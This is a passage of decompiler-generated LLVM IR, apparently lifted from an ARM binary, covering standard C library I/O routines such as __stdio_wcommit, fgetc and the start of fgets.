  store i1 %v3_1fb2c, i1* %cpsr_c.global-to-local, align 1
  %v9_1fb2c = icmp eq i32 %v2_1fb28, %v1_1fb2c
  br i1 %v9_1fb2c, label %dec_label_pc_1fb34, label %dec_label_pc_1fb4c

dec_label_pc_1fb34:                               ; preds = %dec_label_pc_1fb28
  store i32 %v2_1fb28, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1fb44 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1fb44, label %dec_label_pc_1fb48, label %dec_label_pc_1fb28

dec_label_pc_1fb48:                               ; preds = %dec_label_pc_1fb34
  %v0_1fb48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1fb48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1fb4c

dec_label_pc_1fb4c:                               ; preds = %dec_label_pc_1fb28, %dec_label_pc_1fb48
  %v0_1fb4c = phi i32 [ %v0_1fb48, %dec_label_pc_1fb48 ], [ %v2_1fb28, %dec_label_pc_1fb28 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fb4c = icmp eq i32 %v0_1fb4c, 0
  %v2_1fb58.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_1fb4c, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_1fb4c
  %v1_1fb58 = load i32, i32* %r6.global-to-local, align 4
  %v3_1fb58 = add i32 %v2_1fb58.pre, 64
  %v4_1fb58 = inttoptr i32 %v3_1fb58 to i32*
  store i32 %v1_1fb58, i32* %v4_1fb58, align 4
  %v1_1fb5c = load i32, i32* %r1.global-to-local, align 4
  %v2_1fb5c = load i32, i32* %r5.global-to-local, align 4
  %v3_1fb5c = add i32 %v2_1fb5c, 60
  %v4_1fb5c = inttoptr i32 %v3_1fb5c to i32*
  store i32 %v1_1fb5c, i32* %v4_1fb5c, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_1fb4c
  %v2_1fb50 = add i32 %v2_1fb58.pre, 8
  %v3_1fb50 = inttoptr i32 %v2_1fb50 to i32*
  %v4_1fb50 = load i32, i32* %v3_1fb50, align 4
  store i32 %v4_1fb50, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_1fb60 = add i32 %v2_1fb58.pre, 20
  %v4_1fb60 = inttoptr i32 %v3_1fb60 to i32*
  store i32 %v4_1fb50, i32* %v4_1fb60, align 4
  %v1_1fb64 = load i32, i32* %r2.global-to-local, align 4
  %v2_1fb64 = trunc i32 %v1_1fb64 to i16
  %v3_1fb64 = load i32, i32* %r5.global-to-local, align 4
  %v4_1fb64 = inttoptr i32 %v3_1fb64 to i16*
  store i16 %v2_1fb64, i16* %v4_1fb64, align 2
  %v1_1fb68 = load i32, i32* %r3.global-to-local, align 4
  %v2_1fb68 = load i32, i32* %r5.global-to-local, align 4
  %v3_1fb68 = add i32 %v2_1fb68, 24
  %v4_1fb68 = inttoptr i32 %v3_1fb68 to i32*
  store i32 %v1_1fb68, i32* %v4_1fb68, align 4
  %v1_1fb6c = load i32, i32* %r3.global-to-local, align 4
  %v2_1fb6c = load i32, i32* %r5.global-to-local, align 4
  %v3_1fb6c = add i32 %v2_1fb6c, 28
  %v4_1fb6c = inttoptr i32 %v3_1fb6c to i32*
  store i32 %v1_1fb6c, i32* %v4_1fb6c, align 4
  %v1_1fb70 = load i32, i32* %r3.global-to-local, align 4
  %v2_1fb70 = load i32, i32* %r5.global-to-local, align 4
  %v3_1fb70 = add i32 %v2_1fb70, 16
  %v4_1fb70 = inttoptr i32 %v3_1fb70 to i32*
  store i32 %v1_1fb70, i32* %v4_1fb70, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_1fb74 = load i32, i32* %sl.global-to-local, align 4
  %v1_1fb74 = inttoptr i32 %v0_1fb74 to i32*
  %v2_1fb74 = load i32, i32* %v1_1fb74, align 4
  store i32 %v2_1fb74, i32* %r0.global-to-local, align 4
  %v3_1fb74 = add i32 %v0_1fb74, 4
  %v4_1fb74 = inttoptr i32 %v3_1fb74 to i32*
  %v5_1fb74 = load i32, i32* %v4_1fb74, align 4
  store i32 %v5_1fb74, i32* %r1.global-to-local, align 4
  %v6_1fb74 = add i32 %v0_1fb74, 8
  %v7_1fb74 = inttoptr i32 %v6_1fb74 to i32*
  %v8_1fb74 = load i32, i32* %v7_1fb74, align 4
  store i32 %v8_1fb74, i32* %r2.global-to-local, align 4
  %v1_1fb7c = load i32, i32* %r5.global-to-local, align 4
  %v2_1fb7c = add i32 %v1_1fb7c, 52
  %v3_1fb7c = inttoptr i32 %v2_1fb7c to i32*
  store i32 1, i32* %v3_1fb7c, align 4
  %v0_1fb80 = load i32, i32* %r5.global-to-local, align 4
  %v1_1fb80 = add i32 %v0_1fb80, 56
  store i32 %v1_1fb80, i32* %r3.global-to-local, align 4
  %v2_1fb84 = load i32, i32* %r0.global-to-local, align 4
  %v1_1fb88 = inttoptr i32 %v1_1fb80 to i32*
  store i32 %v2_1fb84, i32* %v1_1fb88, align 4
  %v3_1fb88 = add i32 %v0_1fb80, 60
  %v4_1fb88 = inttoptr i32 %v3_1fb88 to i32*
  %v5_1fb88 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1fb88, i32* %v4_1fb88, align 4
  %v6_1fb88 = add i32 %v0_1fb80, 64
  %v7_1fb88 = inttoptr i32 %v6_1fb88 to i32*
  %v8_1fb88 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1fb88, i32* %v7_1fb88, align 4
  %v0_1fb8c = load i32, i32* %r5.global-to-local, align 4
  %v1_1fb8c = add i32 %v0_1fb8c, 32
  %v2_1fb8c = inttoptr i32 %v1_1fb8c to i32*
  %v3_1fb8c = load i32, i32* %v2_1fb8c, align 4
  store i32 %v3_1fb8c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fb90 = icmp eq i32 %v3_1fb8c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1fb98 = add i32 %v3_1fb8c, 56
  store i32 %v1_1fb98, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_1fb90, label %dec_label_pc_1fba4, label %dec_label_pc_1fb08

dec_label_pc_1fba4:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_1fba8 = load i32, i32* %r7.global-to-local, align 4
  %v2_1fba8 = add i32 %v0_1fba8, 76
  %v3_1fba8 = inttoptr i32 %v2_1fba8 to i32*
  %v4_1fba8 = load i32, i32* %v3_1fba8, align 4
  store i32 %v4_1fba8, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_1fba8 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fbc814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_1fbc814, label %dec_label_pc_1fbd0, label %dec_label_pc_1fbb4

dec_label_pc_1fbb4:                               ; preds = %dec_label_pc_1fba4, %dec_label_pc_1fbc8
  %v1_1fbbc = phi i32 [ %storemerge, %dec_label_pc_1fbc8 ], [ %storemerge12, %dec_label_pc_1fba4 ]
  %v1_1fbb4 = inttoptr i32 %v1_1fbbc to i16*
  %v2_1fbb4 = load i16, i16* %v1_1fbb4, align 2
  %v3_1fbb4 = zext i16 %v2_1fbb4 to i32
  store i32 %v3_1fbb4, i32* %r3.global-to-local, align 4
  %v1_1fbb8 = and i32 %v3_1fbb4, 64
  %v2_1fbb8 = icmp eq i32 %v1_1fbb8, 0
  br i1 %v2_1fbb8, label %dec_label_pc_1fbc8, label %bb39

bb39:                                             ; preds = %dec_label_pc_1fbb4
  store i32 %v1_1fbbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1fbc8

dec_label_pc_1fbc8:                               ; preds = %dec_label_pc_1fbb4, %bb39
  %v1_1fbc0 = xor i1 %v2_1fbb8, true
  call void @__pseudo_cond_branch(i1 %v1_1fbc0, i32 ptrtoint (i32* @global_var_1fbf8.700 to i32))
  %v0_1fbc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1fbc4 = add i32 %v0_1fbc4, 32
  %storemerge.in = inttoptr i32 %v1_1fbc4 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fbc8 = icmp eq i32 %storemerge, 0
  br i1 %v2_1fbc8, label %dec_label_pc_1fbd0, label %dec_label_pc_1fbb4

dec_label_pc_1fbd0:                               ; preds = %dec_label_pc_1fbc8, %dec_label_pc_1fba4
  %v2_1fbd4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_1fbd4, i32* %r4.global-to-local, align 4
  %v1_1fbd8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1fbd8

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_1fb8c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1fb2c, { 1, 0 }
  uselistorder i32 %v4_1faec, { 2, 1, 0 }
  uselistorder i32 %v4_1fabc, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 2, 7, 6, 0, 5, 3, 4, 1 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 2, 3, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 0, 7, 3, 4, 5, 6, 1 }
  uselistorder label %dec_label_pc_1fbc8, { 1, 0 }
  uselistorder label %dec_label_pc_1fbb4, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1fb4c, { 1, 0 }
  uselistorder label %dec_label_pc_1fb28, { 1, 0 }
  uselistorder label %dec_label_pc_1fb08, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1fbf8 = load i32, i32* @r4, align 4
  store i32 %v3_1fbf8, i32* %stack_var_-8, align 4
  %v1_1fbfc = add i32 %arg1, 8
  %v2_1fbfc = inttoptr i32 %v1_1fbfc to i32*
  %v3_1fbfc = load i32, i32* %v2_1fbfc, align 4
  store i32 %v3_1fbfc, i32* @r1, align 4
  %v1_1fc00 = add i32 %arg1, 16
  %v2_1fc00 = inttoptr i32 %v1_1fc00 to i32*
  %v3_1fc00 = load i32, i32* %v2_1fc00, align 4
  %v9_1fc04 = icmp eq i32 %v3_1fc00, %v3_1fbfc
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_1fc04, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_1fbfc, i32* %v2_1fc00, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_1fc10 = xor i1 %v9_1fc04, true
  call void @__pseudo_cond_branch(i1 %v1_1fc10, i32 ptrtoint (i32* @global_var_215e8.701 to i32))
  %v0_1fc14 = load i32, i32* %r4.global-to-local, align 4
  %v1_1fc14 = add i32 %v0_1fc14, 8
  %v2_1fc14 = inttoptr i32 %v1_1fc14 to i32*
  %v3_1fc14 = load i32, i32* %v2_1fc14, align 4
  %v1_1fc18 = add i32 %v0_1fc14, 16
  %v2_1fc18 = inttoptr i32 %v1_1fc18 to i32*
  %v3_1fc18 = load i32, i32* %v2_1fc18, align 4
  %v2_1fc1c = sub i32 %v3_1fc18, %v3_1fc14
  %v2_1fc20 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1fc20, i32* @r4, align 4
  ret i32 %v2_1fc1c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1fc28 = load i32, i32* @r4, align 4
  store i32 %v3_1fc28, i32* %stack_var_-20, align 4
  %v6_1fc28 = load i32, i32* @r5, align 4
  %v9_1fc28 = load i32, i32* @r6, align 4
  %v12_1fc28 = load i32, i32* @r7, align 4
  %v15_1fc28 = load i32, i32* @lr, align 4
  %v1_1fc2c = add i32 %arg1, 52
  %v2_1fc2c = inttoptr i32 %v1_1fc2c to i32*
  %v3_1fc2c = load i32, i32* %v2_1fc2c, align 4
  store i32 %v3_1fc2c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fc30 = icmp eq i32 %v3_1fc2c, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_1fc30, label %dec_label_pc_1fc64, label %dec_label_pc_1fc40

dec_label_pc_1fc40:                               ; preds = %entry
  %v1_1fc40 = add i32 %arg1, 16
  %v2_1fc40 = inttoptr i32 %v1_1fc40 to i32*
  %v3_1fc40 = load i32, i32* %v2_1fc40, align 4
  store i32 %v3_1fc40, i32* %r2.global-to-local, align 4
  %v1_1fc44 = add i32 %arg1, 24
  %v2_1fc44 = inttoptr i32 %v1_1fc44 to i32*
  %v3_1fc44 = load i32, i32* %v2_1fc44, align 4
  store i32 %v3_1fc44, i32* %r3.global-to-local, align 4
  %v3_1fc48 = icmp uge i32 %v3_1fc40, %v3_1fc44
  store i1 %v3_1fc48, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1fc48, label %dec_label_pc_1fc58, label %.thread

.thread:                                          ; preds = %dec_label_pc_1fc40
  %v2_1fc4c = inttoptr i32 %v3_1fc40 to i8*
  %v3_1fc4c = load i8, i8* %v2_1fc4c, align 1
  %v4_1fc4c = zext i8 %v3_1fc4c to i32
  store i32 %v4_1fc4c, i32* %r5.global-to-local, align 4
  %v6_1fc4c = add i32 %v3_1fc40, 1
  store i32 %v6_1fc4c, i32* %r2.global-to-local, align 4
  store i32 %v6_1fc4c, i32* %v2_1fc40, align 4
  br label %dec_label_pc_1fd5c

dec_label_pc_1fc58:                               ; preds = %dec_label_pc_1fc40
  %v1_1fc58 = inttoptr i32 %arg1 to i16*
  %v2_1fc58 = call i32 @getc_unlocked(i16* %v1_1fc58)
  store i32 %v2_1fc58, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1fd5c

dec_label_pc_1fc64:                               ; preds = %entry
  %v0_1fc64 = call i32 @__aeabi_read_tp()
  %v0_1fc68 = load i32, i32* @r7, align 4
  %v1_1fc68 = add i32 %v0_1fc68, 64
  %v2_1fc68 = inttoptr i32 %v1_1fc68 to i32*
  %v3_1fc68 = load i32, i32* %v2_1fc68, align 4
  store i32 %v3_1fc68, i32* %r3.global-to-local, align 4
  %v1_1fc6c = add i32 %v0_1fc64, -1168
  store i32 %v1_1fc6c, i32* @r6, align 4
  %v3_1fc70 = icmp uge i32 %v3_1fc68, %v1_1fc6c
  store i1 %v3_1fc70, i1* %cpsr_c.global-to-local, align 1
  %v9_1fc70 = icmp eq i32 %v3_1fc68, %v1_1fc6c
  br i1 %v9_1fc70, label %dec_label_pc_1fcb8, label %dec_label_pc_1fc78

dec_label_pc_1fc78:                               ; preds = %dec_label_pc_1fc64
  %v1_1fc78 = add i32 %v0_1fc68, 56
  store i32 %v1_1fc78, i32* @r5, align 4
  store i32 %v1_1fc78, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1fc84

dec_label_pc_1fc84:                               ; preds = %dec_label_pc_1fc90.dec_label_pc_1fc84_crit_edge, %dec_label_pc_1fc78
  %v0_1fc84 = phi i32 [ %v0_1fc84.pre, %dec_label_pc_1fc90.dec_label_pc_1fc84_crit_edge ], [ %v1_1fc78, %dec_label_pc_1fc78 ]
  %v1_1fc84 = inttoptr i32 %v0_1fc84 to i32*
  %v2_1fc84 = load i32, i32* %v1_1fc84, align 4
  store i32 %v2_1fc84, i32* %r3.global-to-local, align 4
  %v1_1fc88 = load i32, i32* @r4, align 4
  %v3_1fc88 = icmp uge i32 %v2_1fc84, %v1_1fc88
  store i1 %v3_1fc88, i1* %cpsr_c.global-to-local, align 1
  %v9_1fc88 = icmp eq i32 %v2_1fc84, %v1_1fc88
  br i1 %v9_1fc88, label %dec_label_pc_1fc90, label %dec_label_pc_1fca8

dec_label_pc_1fc90:                               ; preds = %dec_label_pc_1fc84
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1fca0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1fca0, label %dec_label_pc_1fca4, label %dec_label_pc_1fc90.dec_label_pc_1fc84_crit_edge

dec_label_pc_1fc90.dec_label_pc_1fc84_crit_edge:  ; preds = %dec_label_pc_1fc90
  %v0_1fc84.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1fc84

dec_label_pc_1fca4:                               ; preds = %dec_label_pc_1fc90
  %v0_1fca4 = load i32, i32* @r4, align 4
  store i32 %v0_1fca4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1fca8

dec_label_pc_1fca8:                               ; preds = %dec_label_pc_1fc84, %dec_label_pc_1fca4
  %v0_1fca8 = phi i32 [ %v0_1fca4, %dec_label_pc_1fca4 ], [ %v2_1fc84, %dec_label_pc_1fc84 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fca8 = icmp eq i32 %v0_1fca8, 0
  br i1 %v2_1fca8, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_1fca8
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1fca8, %bb
  store i32 130228, i32* @lr, align 4
  %v1_1fcb0 = xor i1 %v2_1fca8, true
  call void @__pseudo_cond_branch(i1 %v1_1fcb0, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  %v0_1fcb4 = load i32, i32* @r6, align 4
  %v1_1fcb4 = load i32, i32* @r7, align 4
  %v2_1fcb4 = add i32 %v1_1fcb4, 64
  %v3_1fcb4 = inttoptr i32 %v2_1fcb4 to i32*
  store i32 %v0_1fcb4, i32* %v3_1fcb4, align 4
  %v0_1fcb8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1fcb8

dec_label_pc_1fcb8:                               ; preds = %dec_label_pc_1fc64, %bb18
  %v1_1fcc8 = phi i32 [ %v0_1fc68, %dec_label_pc_1fc64 ], [ %v0_1fcb8.pre, %bb18 ]
  %v1_1fcb8 = add i32 %v1_1fcc8, 60
  %v2_1fcb8 = inttoptr i32 %v1_1fcb8 to i32*
  %v3_1fcb8 = load i32, i32* %v2_1fcb8, align 4
  store i32 %v3_1fcb8, i32* %r2.global-to-local, align 4
  %v1_1fcbc = add i32 %v1_1fcc8, 16
  %v2_1fcbc = inttoptr i32 %v1_1fcbc to i32*
  %v3_1fcbc = load i32, i32* %v2_1fcbc, align 4
  store i32 %v3_1fcbc, i32* @r1, align 4
  %v1_1fcc0 = add i32 %v1_1fcc8, 24
  %v2_1fcc0 = inttoptr i32 %v1_1fcc0 to i32*
  %v3_1fcc0 = load i32, i32* %v2_1fcc0, align 4
  store i32 %v3_1fcc0, i32* %r3.global-to-local, align 4
  %v1_1fcc4 = add i32 %v3_1fcb8, 1
  store i32 %v1_1fcc4, i32* %r2.global-to-local, align 4
  store i32 %v1_1fcc4, i32* %v2_1fcb8, align 4
  %v0_1fccc = load i32, i32* @r1, align 4
  %v1_1fccc = load i32, i32* %r3.global-to-local, align 4
  %v3_1fccc = icmp uge i32 %v0_1fccc, %v1_1fccc
  store i1 %v3_1fccc, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1fccc, label %dec_label_pc_1fcdc, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1fcb8
  %v2_1fcd0 = inttoptr i32 %v0_1fccc to i8*
  %v3_1fcd0 = load i8, i8* %v2_1fcd0, align 1
  %v4_1fcd0 = zext i8 %v3_1fcd0 to i32
  store i32 %v4_1fcd0, i32* %r5.global-to-local, align 4
  %v6_1fcd0 = add i32 %v0_1fccc, 1
  store i32 %v6_1fcd0, i32* @r1, align 4
  %v2_1fcd4 = load i32, i32* @r7, align 4
  %v3_1fcd4 = add i32 %v2_1fcd4, 16
  %v4_1fcd4 = inttoptr i32 %v3_1fcd4 to i32*
  store i32 %v6_1fcd0, i32* %v4_1fcd4, align 4
  br label %dec_label_pc_1fce8

dec_label_pc_1fcdc:                               ; preds = %dec_label_pc_1fcb8
  %v0_1fcdc = load i32, i32* @r7, align 4
  %v1_1fce0 = inttoptr i32 %v0_1fcdc to i16*
  %v2_1fce0 = call i32 @getc_unlocked(i16* %v1_1fce0)
  store i32 %v2_1fce0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1fce8

dec_label_pc_1fce8:                               ; preds = %.thread2, %dec_label_pc_1fcdc
  %v0_1fce8 = load i32, i32* @r7, align 4
  %v1_1fce8 = add i32 %v0_1fce8, 60
  %v2_1fce8 = inttoptr i32 %v1_1fce8 to i32*
  %v3_1fce8 = load i32, i32* %v2_1fce8, align 4
  %v1_1fcec = add i32 %v3_1fce8, -1
  store i32 %v1_1fcec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fcf0 = icmp eq i32 %v1_1fcec, 0
  store i32 %v1_1fcec, i32* %v2_1fce8, align 4
  br i1 %v2_1fcf0, label %dec_label_pc_1fcfc, label %dec_label_pc_1fd5c

dec_label_pc_1fcfc:                               ; preds = %dec_label_pc_1fce8
  %v0_1fcfc = load i32, i32* %r3.global-to-local, align 4
  %v1_1fcfc = load i32, i32* @r7, align 4
  %v2_1fcfc = add i32 %v1_1fcfc, 64
  %v3_1fcfc = inttoptr i32 %v2_1fcfc to i32*
  store i32 %v0_1fcfc, i32* %v3_1fcfc, align 4
  %v0_1fd00 = load i32, i32* @r7, align 4
  %v1_1fd00 = add i32 %v0_1fd00, 56
  store i32 %v1_1fd00, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1fd04

dec_label_pc_1fd04:                               ; preds = %dec_label_pc_1fd34.dec_label_pc_1fd04_crit_edge, %dec_label_pc_1fcfc
  %v0_1fd0c = phi i32 [ %v0_1fd0c.pre, %dec_label_pc_1fd34.dec_label_pc_1fd04_crit_edge ], [ %v1_1fd00, %dec_label_pc_1fcfc ]
  %v0_1fd04 = phi i32 [ %v0_1fd04.pre, %dec_label_pc_1fd34.dec_label_pc_1fd04_crit_edge ], [ %v0_1fd00, %dec_label_pc_1fcfc ]
  %v1_1fd04 = add i32 %v0_1fd04, 56
  %v2_1fd04 = inttoptr i32 %v1_1fd04 to i32*
  %v3_1fd04 = load i32, i32* %v2_1fd04, align 4
  store i32 %v3_1fd04, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1fd0c, i32* %r2.global-to-local, align 4
  %v1_1fd1022 = inttoptr i32 %v0_1fd0c to i32*
  %v2_1fd1023 = load i32, i32* %v1_1fd1022, align 4
  store i32 %v2_1fd1023, i32* %r3.global-to-local, align 4
  %v3_1fd1425 = icmp uge i32 %v2_1fd1023, %v3_1fd04
  store i1 %v3_1fd1425, i1* %cpsr_c.global-to-local, align 1
  %v9_1fd1431 = icmp eq i32 %v2_1fd1023, %v3_1fd04
  br i1 %v9_1fd1431, label %dec_label_pc_1fd1c, label %dec_label_pc_1fd34

dec_label_pc_1fd1c:                               ; preds = %dec_label_pc_1fd04, %dec_label_pc_1fd1c.dec_label_pc_1fd10_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1fd2c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1fd2c, label %dec_label_pc_1fd30, label %dec_label_pc_1fd1c.dec_label_pc_1fd10_crit_edge

dec_label_pc_1fd1c.dec_label_pc_1fd10_crit_edge:  ; preds = %dec_label_pc_1fd1c
  %v0_1fd10.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1fd14.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1fd10 = inttoptr i32 %v0_1fd10.pre to i32*
  %v2_1fd10 = load i32, i32* %v1_1fd10, align 4
  store i32 %v2_1fd10, i32* %r3.global-to-local, align 4
  %v3_1fd14 = icmp uge i32 %v2_1fd10, %v1_1fd14.pre
  store i1 %v3_1fd14, i1* %cpsr_c.global-to-local, align 1
  %v9_1fd14 = icmp eq i32 %v2_1fd10, %v1_1fd14.pre
  br i1 %v9_1fd14, label %dec_label_pc_1fd1c, label %dec_label_pc_1fd34

dec_label_pc_1fd30:                               ; preds = %dec_label_pc_1fd1c
  %v0_1fd30 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1fd30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1fd34

dec_label_pc_1fd34:                               ; preds = %dec_label_pc_1fd04, %dec_label_pc_1fd1c.dec_label_pc_1fd10_crit_edge, %dec_label_pc_1fd30
  %v0_1fd3c = phi i32 [ %v0_1fd30, %dec_label_pc_1fd30 ], [ %v2_1fd1023, %dec_label_pc_1fd04 ], [ %v2_1fd10, %dec_label_pc_1fd1c.dec_label_pc_1fd10_crit_edge ]
  %v1_1fd34 = phi i32 [ %v0_1fd30, %dec_label_pc_1fd30 ], [ %v3_1fd04, %dec_label_pc_1fd04 ], [ %v1_1fd14.pre, %dec_label_pc_1fd1c.dec_label_pc_1fd10_crit_edge ]
  %v3_1fd34 = icmp uge i32 %v0_1fd3c, %v1_1fd34
  store i1 %v3_1fd34, i1* %cpsr_c.global-to-local, align 1
  %v9_1fd34 = icmp eq i32 %v0_1fd3c, %v1_1fd34
  br i1 %v9_1fd34, label %dec_label_pc_1fd3c, label %dec_label_pc_1fd34.dec_label_pc_1fd04_crit_edge

dec_label_pc_1fd34.dec_label_pc_1fd04_crit_edge:  ; preds = %dec_label_pc_1fd34
  %v0_1fd04.pre = load i32, i32* @r7, align 4
  %v0_1fd0c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1fd04

dec_label_pc_1fd3c:                               ; preds = %dec_label_pc_1fd34
  %v2_1fd3c = icmp ne i32 %v1_1fd34, 0
  store i1 %v2_1fd3c, i1* %cpsr_c.global-to-local, align 1
  %v7_1fd40 = icmp slt i32 %v1_1fd34, 2
  br i1 %v7_1fd40, label %dec_label_pc_1fd5c, label %dec_label_pc_1fd44

dec_label_pc_1fd44:                               ; preds = %dec_label_pc_1fd3c
  %v0_1fd48 = load i32, i32* @r1, align 4
  %v1_1fd48 = add i32 %v0_1fd48, 129
  store i32 %v1_1fd48, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1fd5c

dec_label_pc_1fd5c:                               ; preds = %.thread, %dec_label_pc_1fce8, %dec_label_pc_1fd44, %dec_label_pc_1fd3c, %dec_label_pc_1fc58
  %v0_1fd5c = load i32, i32* %r5.global-to-local, align 4
  %v2_1fd64 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1fd64, i32* @r4, align 4
  store i32 %v6_1fc28, i32* @r5, align 4
  store i32 %v9_1fc28, i32* @r6, align 4
  store i32 %v12_1fc28, i32* @r7, align 4
  store i32 %v15_1fc28, i32* @lr, align 4
  ret i32 %v0_1fd5c

; uselistorder directives
  uselistorder i32 %v0_1fd30, { 1, 0, 2 }
  uselistorder i32 %v1_1fd14.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1fccc, { 1, 0, 2 }
  uselistorder i32 %v1_1fcc8, { 0, 2, 1 }
  uselistorder i32 %v1_1fc88, { 1, 0 }
  uselistorder i32 %v3_1fc40, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1fd5c, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_1fd34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1fd1c, { 1, 0 }
  uselistorder label %dec_label_pc_1fce8, { 1, 0 }
  uselistorder label %dec_label_pc_1fcb8, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_1fca8, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
